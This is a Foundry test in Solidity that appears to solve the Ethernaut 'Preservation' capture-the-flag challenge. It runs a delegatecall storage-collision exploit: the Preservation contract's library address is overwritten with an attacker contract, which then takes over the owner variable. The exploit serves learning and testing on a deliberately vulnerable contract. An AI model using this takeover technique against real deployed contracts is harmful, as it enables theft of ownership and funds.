// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import {console2} from "forge-std/console2.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "forge-std/Test.sol";
import "../src/Attacker.sol";
import "../src/Contract.sol";
import "forge-std/console.sol";

/// @dev If this is your first time with Forge, read this tutorial in the Foundry Book:
/// https://book.getfoundry.sh/forge/writing-tests
contract AttackTest is StdCheats, Test {
    /// @dev A function invoked before each test case is run.

    address alice = 0x80805ae3cbE23715C1f1807A03C5fb669541C2A9;
    Preservation preservation;
    Attacker attacker; 

    function setUp() public virtual {
        // Instantiate the contract-under-test.
        vm.prank(alice);
        LibraryContract timeZone1Library = new LibraryContract();
        LibraryContract timeZone2Library = new LibraryContract();
        preservation = new Preservation(address(timeZone1Library), address(timeZone2Library));
        attacker = new Attacker();

    }

    function testAttack() public {
        vm.prank(alice);
        //set preservation storage slot 0 to uint representation of attacker address
        preservation.setFirstTime(uint160(address(attacker)));

        require(preservation.timeZone1Library() == (address(attacker)), 'failed to set storage slot 0');
        
        // now call preservation.setFirstTime again so that the code in our attacker setTime(uint) can execute and change the preservation contract owner 
        preservation.setFirstTime(1);

        require(preservation.owner() == alice, 'owner not changed');

    }


}
